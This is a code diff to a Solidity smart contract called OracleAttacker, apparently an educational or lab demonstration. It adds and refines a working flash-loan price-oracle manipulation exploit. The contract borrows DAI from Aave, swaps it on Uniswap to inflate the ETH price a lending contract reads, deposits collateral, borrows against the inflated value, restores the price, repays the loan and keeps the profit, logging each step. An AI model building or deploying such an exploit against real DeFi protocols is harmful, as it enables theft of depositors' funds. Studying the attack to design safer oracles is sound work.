@@ -31,6 +31,31 @@ contract OracleAttacker {
         owner = msg.sender;
     }
 
+    function flash_loan(uint256 flashLoanAmount, uint256 collateralToDeposit) external {
+        // Setup flash loan call
+        address[] memory assets = new address[](1);
+        assets[0] = DAI;
+
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = flashLoanAmount;
+
+        uint256[] memory modes = new uint256[](1);
+        modes[0] = 0; // 0 = no debt, must repay in same transaction
+
+        bytes memory params = abi.encode(collateralToDeposit);
+
+        ILendingPool(aavePool)
+            .flashLoan(
+                address(this),
+                assets,
+                amounts,
+                modes,
+                address(this),
+                params,
+                0 // referral code
+            );
+    }
+
     /**
      * @dev Flash loan callback - called by Aave during flash loan
      *
@@ -54,23 +79,21 @@ contract OracleAttacker {
         external
         returns (bool)
     {
-        console.log("\n=== FLASH LOAN CALLBACK (executeOperation) ===");
-        console.log("Flash loan received:", amounts[0] / 1e18, assets[0] == DAI ? "DAI" : "WETH");
-        console.log("Premium to pay:", premiums[0] / 1e18, assets[0] == DAI ? "DAI" : "WETH");
-
         // Security checks
         require(msg.sender == address(aavePool), "Caller must be Aave");
-        // require(initiator == address(this), "Initiator must be this contract");
+        require(initiator == address(this), "Initiator must be this contract");
+
+        console.log("  Received:", amounts[0] / 1e18, "DAI");
+        console.log("  Premium:", premiums[0] / 1e18, "DAI\n");
 
         // Decode parameters
         uint256 collateralToDeposit = abi.decode(params, (uint256));
 
         // Record initial state
         uint256 priceInitial = lending.getETHPrice();
-        console.log("\nInitial ETH price:", priceInitial / 1e18, "DAI per ETH");
 
-        // ----- STEP 1: Manipulate price UP by swapping DAI -> WETH -----
-        console.log("\n[STEP 1] Swapping DAI -> WETH to push ETH price UP...");
+        // ----- Manipulate price UP by swapping DAI -> WETH -----
+        console.log("[STEP 2] Swapping DAI -> WETH to push ETH price UP...");
         uint256 daiToSwap = (amounts[0] * 80) / 100; // Use 80% of flash loan
         console.log("  Swapping:", daiToSwap / 1e18, "DAI -> WETH");
         IERC20(DAI).approve(address(uniswapRouter), daiToSwap);
@@ -92,32 +115,32 @@ contract OracleAttacker {
         uint256 priceManipulated = lending.getETHPrice();
         console.log("  New ETH price:", priceManipulated / 1e18, "DAI per ETH");
         console.log(
-            "  Price increased by:", (priceManipulated - priceInitial) * 100 / priceInitial, "%"
+            "  Price increased by:", (priceManipulated - priceInitial) * 100 / priceInitial, "%\n"
         );
 
         // ----- STEP 2: Deposit collateral at inflated price -----
-        console.log("\n[STEP 2] Depositing ETH collateral at inflated price...");
+        console.log("[STEP 3] Depositing ETH collateral at inflated price...");
         console.log("  Depositing:", collateralToDeposit / 1e18, "ETH");
 
         lending.depositCollateral{ value: collateralToDeposit }();
 
-        // Calculate how much we can borrow
         uint256 collateralValue = (collateralToDeposit * priceManipulated) / 1e18;
+        console.log("  Collateral value at inflated price:", collateralValue / 1e18, "DAI\n");
+
+        // ----- Borrow maximum DAI -----
+        console.log("[STEP 4] Borrowing DAI at inflated price...");
+        // Calculate how much we can borrow
         uint256 maxBorrow = (collateralValue * 100) / 150; // 150% collateral ratio
-
-        console.log("  Collateral value at inflated price:", collateralValue / 1e18, "DAI");
         console.log("  Can borrow up to:", maxBorrow / 1e18, "DAI");
-
-        // ----- STEP 3: Borrow maximum DAI -----
-        console.log("\n[STEP 3] Borrowing DAI at inflated price...");
 
         // Borrow as much as possible (but leave some buffer for safety)
         uint256 amountToBorrow = (maxBorrow * 95) / 100; // Borrow 95% of max
-        console.log("  Borrowing:", amountToBorrow / 1e18, "DAI");
+        console.log("  Borrowing:", amountToBorrow / 1e18, "DAI\n");
+
         lending.borrow(amountToBorrow);
 
-        // ----- STEP 4: Restore price by swapping WETH -> DAI -----
-        console.log("\n[STEP 4] Swapping WETH -> DAI to restore price...");
+        // ----- Restore price by swapping WETH -> DAI -----
+        console.log("[STEP 5] Swapping WETH -> DAI to restore price...");
 
         uint256 wethBalance = IERC20(WETH).balanceOf(address(this));
         console.log("  Current WETH balance:", wethBalance / 1e18, "WETH");
@@ -133,10 +156,10 @@ contract OracleAttacker {
         );
 
         uint256 priceFinal = lending.getETHPrice();
-        console.log("  Price after restoration:", priceFinal / 1e18, "DAI per ETH");
+        console.log("  Price after restoration:", priceFinal / 1e18, "DAI per ETH\n");
 
-        // ----- STEP 5: Repay flash loan -----
-        console.log("\n[STEP 5] Repaying flash loan...");
+        // ----- Repay flash loan -----
+        console.log("[STEP 6] Repaying flash loan...");
 
         uint256 amountOwing = amounts[0] + premiums[0];
         uint256 currentDAI = IERC20(DAI).balanceOf(address(this));
@@ -152,10 +175,6 @@ contract OracleAttacker {
         uint256 profit = currentDAI - amountOwing;
         console.log("  Repaying flash loan: ", amountOwing / 1e18, "DAI");
         console.log("  Profit remaining:", profit / 1e18, "DAI");
-
-        //console.log("\n=== ATTACK COMPLETE ===");
-        //console.log("Total DAI stolen:", stolenDAI / 1e18, "DAI");
-        //console.log("Net profit after flash loan:", profit / 1e18, "DAI");
 
         return true;
     }
